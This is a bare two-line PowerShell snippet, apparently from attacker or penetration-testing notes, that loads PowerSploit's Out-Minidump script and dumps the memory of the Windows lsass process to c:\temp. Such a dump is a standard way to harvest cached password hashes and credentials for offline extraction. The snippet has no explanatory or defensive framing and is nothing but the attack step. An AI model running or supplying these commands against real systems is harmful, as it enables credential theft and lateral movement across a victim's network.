Import-Module c:\users\administrator\downloads\PowerSploit-master\Exfiltration\Out-Minidump.ps1
Get-Process lsass | Out-Minidump -DumpFilePath c:\temp
